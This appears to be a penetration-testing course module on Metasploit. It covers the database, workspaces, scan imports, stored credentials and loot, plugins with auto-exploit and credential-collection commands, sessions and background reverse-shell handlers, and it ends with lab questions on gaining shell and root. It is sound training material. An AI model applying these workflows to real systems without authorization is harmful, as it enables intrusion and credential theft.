crimsonguard@htb[/htb]``$ sudo msfdb init  [i] Database already started [+] Creating database user 'msf' [+] Creating databases 'msf' [+] Creating databases 'msf_test' [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml' [+] Creating initial database schema rake aborted! NoMethodError: undefined method `without' for #<Bundler::Settings:0x000055dddcf8cba8> Did you mean? with_options  <SNIP>``

Sometimes an error can occur if Metasploit is not up to date. This difference that causes the error can happen for several reasons. First, often it helps to update Metasploit again (`apt update`) to solve this problem. Then we can try to reinitialize the MSF database.

crimsonguard@htb[/htb]`$ sudo msfdb init  [i] Database already started [i] The database appears to be already configured, skipping initialization`

If the initialization is skipped and Metasploit tells us that the database is already configured, we can recheck the status of the database.

crimsonguard@htb[/htb]`$ sudo msfdb status  ● postgresql.service - PostgreSQL RDBMS      Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)      Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago     Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)    Main PID: 2476 (code=exited, status=0/SUCCESS)         CPU: 1ms  May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS... May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.  COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN) postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)  UID          PID    PPID  C STIME TTY      STAT   TIME CMD postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con  [+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)`

If this error does not appear, which often happens after a fresh installation of Metasploit, then we will see the following when initializing the database:

crimsonguard@htb[/htb]`$ sudo msfdb init  [+] Starting database [+] Creating database user 'msf' [+] Creating databases 'msf' [+] Creating databases 'msf_test' [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml' [+] Creating initial database schema`

After the database has been initialized, we can start `msfconsole` and connect to the created database simultaneously.

#### MSF - Connect to the Initiated Database

crimsonguard@htb[/htb]`$ sudo msfdb run  [i] Database already started                                                             .                                         .  .        dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o        '   dB'                     BBP     dB'dB'dB' dBBP     dBP     dBP BB    dB'dB'dB' dBP      dBP     dBP  BB   dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                     dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP           .                  .                  dB' dBP    dB'.BP                              |       dBP    dBBBB' dBP    dB'.BP dBP    dBP                            --o--    dBP    dBP    dBP    dB'.BP dBP    dBP                              |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                                                      .                 .         o                  To boldly go where no                             shell has gone before          =[ metasploit v6.1.39-dev                          ] + -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ] + -- --=[ 616 payloads - 45 encoders - 11 nops            ] + -- --=[ 9 evasion                                       ]  msf6>`

If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:

#### MSF - Reinitiate the Database

crimsonguard@htb[/htb]`$ msfdb reinit $ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/ $ sudo service postgresql restart $ msfconsole -q  msf6 > db_status  [*] Connected to msf. Connection type: PostgreSQL.`

Now, we are good to go. The `msfconsole` also offers integrated help for the database. This gives us a good overview of interacting with and using the database.

#### MSF - Database Options

```shell-session
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
	

msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```

## Using the Database

With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our `Workspaces`.

#### Workspaces

We can think of `Workspaces` the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

To view the current Workspace list, use the `workspace` command. Adding a `-a` or `-d` switch after the command, followed by the workspace's name, will either `add` or `delete` that workspace to the database.

```shell-session
msf6 > workspace

* default
```

Notice that the default Workspace is named `default` and is currently in use according to the `*` symbol. Type the `workspace [name]` command to switch the presently used workspace. Looking back at our example, let us create a workspace for this assessment and select it.

```shell-session
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

To see what else we can do with Workspaces, we can use the `workspace -h` command for the help menu related to Workspaces.

```shell-session
msf6 > workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information
```

## Importing Scan Results

Next, let us assume we want to import a `Nmap scan` of a host into our Database's Workspace to understand the target better. We can use the `db_import` command for this. After the import is complete, we can check the presence of the host's information in our database by using the `hosts` and `services` commands. Note that the `.xml` file type is preferred for `db_import`.

#### Stored Nmap Scan

crimsonguard@htb[/htb]`$ cat Target.nmap  Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC Nmap scan report for 10.10.10.40 Host is up (0.017s latency). Not shown: 991 closed ports PORT      STATE SERVICE      VERSION 135/tcp   open  msrpc        Microsoft Windows RPC 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open  msrpc        Microsoft Windows RPC 49153/tcp open  msrpc        Microsoft Windows RPC 49154/tcp open  msrpc        Microsoft Windows RPC 49155/tcp open  msrpc        Microsoft Windows RPC 49156/tcp open  msrpc        Microsoft Windows RPC 49157/tcp open  msrpc        Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds`

#### Importing Scan Results

```shell-session
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

## Using Nmap Inside MSFconsole

Alternatively, we can use Nmap straight from msfconsole! To scan directly from the console without having to background or exit the process, use the `db_nmap` command.

#### MSF - Nmap

```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 999 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

## Data Backup

After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. To do so, use the `db_export` command.

#### MSF - DB Export

```shell-session
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified


msf6 > db_export -f xml backup.xml

[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```

This data can be imported back to msfconsole later when needed. Other commands related to data retention are the extended use of `hosts`, `services`, and the `creds` and `loot` commands.

## Hosts

The `hosts` command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. For example, suppose `msfconsole` is linked with scanner plugins that can perform service and OS detection. In that case, this information should automatically appear in the table once the scans are completed through msfconsole. Again, tools like Nessus, NexPose, or Nmap will help us in these cases.

Hosts can also be manually added as separate entries in this table. After adding our custom hosts, we can also organize the format and structure of the table, add comments, change existing information, and more.

#### MSF - Stored Hosts

```shell-session
msf6 > hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -C <col1,col2>    Only show the given columns until the next restart (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```

## Services

The `services` command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.

#### MSF - Stored Services of Hosts

```shell-session
msf6 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```

## Credentials

The `creds` command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.

#### MSF - Stored Credentials

```shell-session
msf6 > creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    Postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John the Ripper hash type.
    realm     :  Realm, 
    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.

Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a NTLMHash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a Postgres MD5
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   # Add a user with an SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   # Add a NonReplayableHash
   creds add hash:d19c32489b870735b5f587d76b934283

General options
  -h,--help             Show this help information
  -o <file>             Send output to a file in csv/jtr (john the ripper) format.
                        If the file name ends in '.jtr', that format will be used.
                        If file name ends in '.hcat', the hashcat format will be used.
                        CSV by default.
  -d,--delete           Delete one or more credentials

Filter options for listing
  -P,--password <text>  List passwords that match this text
  -p,--port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,--user <text>      List users that match this text
  -t,--type <type>      List creds that match the following types: password,ntlm,hash
  -O,--origins <IP>     List creds that match these origins
  -R,--rhosts           Set RHOSTS from the results of the search
  -v,--verbose          Don't truncate long password hashes

Examples, John the Ripper hash types:
  Operating Systems (starts with)
    Blowfish ($2a$)   : bf
    BSDi     (_)      : bsdi
    DES               : des,crypt
    MD5      ($1$)    : md5
    SHA256   ($5$)    : sha256,crypt
    SHA512   ($6$)    : sha512,crypt
  Databases
    MSSQL             : mssql
    MSSQL 2005        : mssql05
    MSSQL 2012/2014   : mssql12
    MySQL < 4.1       : mysql
    MySQL >= 4.1      : mysql-sha1
    Oracle            : des,oracle
    Oracle 11         : raw-sha1,oracle11
    Oracle 11 (H type): dynamic_1506
    Oracle 12c        : oracle12c
    Postgres          : postgres,raw-md5

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -O 1.2.3.4/24 # Return credentials with origins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t NTLM       # All NTLM creds
  creds -j md5        # All John the Ripper hash type MD5 creds

Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```

## Loot

The `loot` command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.

#### MSF - Stored Loot

```shell-session
msf6 > loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```

# Plugins

Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework. These can represent commercial products that have a `Community Edition` for free use but with limited functionality, or they can be individual projects developed by individual people.

The use of plugins makes a pentester's life even easier, bringing the functionality of well-known software into the `msfconsole` or Metasploit Pro environments. Whereas before, we needed to cycle between different software to import and export results, setting options and parameters over and over again, now, with the use of plugins, everything is automatically documented by msfconsole into the database we are using and hosts, services and vulnerabilities are made available at-a-glance for the user. [Plugins](https://web.archive.org/web/20240302133153/https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin) work directly with the API and can be used to manipulate the entire framework. They can be useful for automating repetitive tasks, adding new commands to the `msfconsole`, and extending the already powerful framework.

## Using Plugins

To start using a plugin, we will need to ensure it is installed in the correct directory on our machine. Navigating to `/usr/share/metasploit-framework/plugins`, which is the default directory for every new installation of `msfconsole`, should show us which plugins we have to our availability:

crimsonguard@htb[/htb]`$ ls /usr/share/metasploit-framework/plugins  aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb`

If the plugin is found here, we can fire it up inside `msfconsole` and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:

#### MSF - Load Nessus

```shell-session
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus


msf6 > nessus_help

Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username and 

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password
                            
Policy Commands             
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete a policy
```

If the plugin is not installed correctly, we will receive the following error upon trying to load it.

```shell-session
msf6 > load Plugin_That_Does_Not_Exist

[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb
```

To start using the plugin, start issuing the commands available to us in the help menu of that specific plugin. Each cross-platform integration offers us a unique set of interactions that we can use during our assessments, so it is helpful to read up on each of these before employing them to get the most out of having them at our fingertips.

## Installing new Plugins

New, more popular plugins are installed with each update of the Parrot OS distro as they are pushed out towards the public by their makers, collected in the Parrot update repo. To install new custom plugins not included in new updates of the distro, we can take the .rb file provided on the maker's page and place it in the folder at `/usr/share/metasploit-framework/plugins` with the proper permissions.

For example, let us try installing [DarkOperator's Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins.git). Then, following the link above, we get a couple of Ruby (`.rb`) files which we can directly place in the folder mentioned above.

#### Downloading MSF Plugins

crimsonguard@htb[/htb]`$ git clone https://github.com/darkoperator/Metasploit-Plugins $ ls Metasploit-Plugins  aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb alias.rb           komand.rb      pentest.rb           thread.rb auto_add_route.rb  lab.rb         request.rb           token_adduser.rb beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb db_credcollect.rb  msfd.rb        sample.rb            twitt.rb db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb ffautoregen.rb     nexpose.rb     socket_logger.rb growl.rb           openvas.rb     sounds.rb`

Here we can take the plugin `pentest.rb` as an example and copy it to `/usr/share/metasploit-framework/plugins`.

#### MSF - Copying Plugin to MSF

crimsonguard@htb[/htb]`$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb`

Afterward, launch `msfconsole` and check the plugin's installation by running the `load` command. After the plugin has been loaded, the `help menu` at the `msfconsole` is automatically extended by additional functions.

#### MSF - Load Plugin

crimsonguard@htb[/htb]``$ msfconsole -q  msf6 > load pentest         ___         _          _     ___ _           _       | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _       |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \        |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|                                               |___/        Version 1.6 Pentest Plugin loaded. by Carlos Perez (carlos_perez[at]darkoperator.com) [*] Successfully loaded plugin: pentest   msf6 > help  Tradecraft Commands ===================      Command          Description     -------          -----------     check_footprint  Checks the possible footprint of a post module on a target system.   auto_exploit Commands =====================      Command           Description     -------           -----------     show_client_side  Show matched client side exploits from data imported from vuln scanners.     vuln_exploit      Runs exploits based on data imported from vuln scanners.   Discovery Commands ==================      Command                 Description     -------                 -----------     discover_db             Run discovery modules against current hosts in the database.     network_discover        Performs a port-scan and enumeration of services found for non pivot networks.     pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.     show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.   Project Commands ================      Command       Description     -------       -----------     project       Command for managing projects.   Postauto Commands =================      Command             Description     -------             -----------     app_creds           Run application password collection modules against specified sessions.     get_lhost           List local IP addresses that can be used for LHOST.     multi_cmd           Run shell command against several sessions     multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.     multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.     multi_post          Run a post module against specified sessions.     multi_post_rc       Run resource file with post modules and options against specified sessions.     sys_creds           Run system password collection modules against specified sessions.  <SNIP>``

Many people write many different plugins for the Metasploit framework. They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them. Check out the list of popular plugins below:

||||
|---|---|---|
|[nMap (pre-installed)](https://nmap.org/)|[NexPose (pre-installed)](https://sectools.org/tool/nexpose/)|[Nessus (pre-installed)](https://www.tenable.com/products/nessus)|
|[Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)|[Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)|[Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)|
|[Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)|[Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)|[Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)|

## Mixins

The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes `msfconsole` excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.

Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:

1. Want to provide a lot of optional features for a class.
2. Want to use one particular feature for a multitude of classes.

Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word `include`, to which we pass the name of the module as a `parameter`. We can read more about mixins [here](https://en.wikibooks.org/wiki/Metasploit/UsingMixins).

If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment. However, they are mentioned here as a note of how complex the customization of Metasploit can become.

# Sessions

MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of `Sessions`, which creates dedicated control interfaces for all of your deployed modules.

Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs. Note that once a session is placed in the background, it will continue to run, and our connection to the target host will persist. Sessions can, however, die if something goes wrong during the payload runtime, causing the communication channel to tear down.

## Using Sessions

While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages. This will prompt us with a confirmation message. After accepting the prompt, we will be taken back to the msfconsole prompt (`msf6 >`) and will immediately be able to launch a different module.

#### Listing Active Sessions

We can use the `sessions` command to view our currently active sessions.

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### Interacting with a Session

You can use the `sessions -i [no.]` command to open up a specific session.

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.

This can be done by backgrounding our current session, which is formed due to the success of the first exploit, searching for the second module we wish to run, and, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module's `show options` menu.

Usually, these modules can be found in the `post` category, referring to Post-Exploitation modules. The main archetypes of modules in this category consist of credential gatherers, local exploit suggesters, and internal network scanners.

## Jobs

If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using `[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port.

Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.

#### Viewing the Jobs Command Help Menu

We can view the help menu for this command, like others, by typing `jobs -h`.

```shell-session
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### Viewing the Exploit Command Help Menu

When we run an exploit, we can run it as a job by typing `exploit -j`. Per the help menu for the `exploit` command, adding `-j` to our command. Instead of just `exploit` or `run`, will "run it in the context of a job."

```shell-session
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```

#### Running an Exploit as a Background Job

```shell-session

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### Listing Running Jobs

To list all running jobs, we can use the `jobs -l` command. To kill a specific job, look at the index no. of the job and use the `kill [index no.]` command. Use the `jobs -K` command to kill all running jobs.

```shell-session

msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

Next up, we'll work with the extremely powerful `Meterpreter` payload.

---

The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?
- 

Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
- 

The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
- 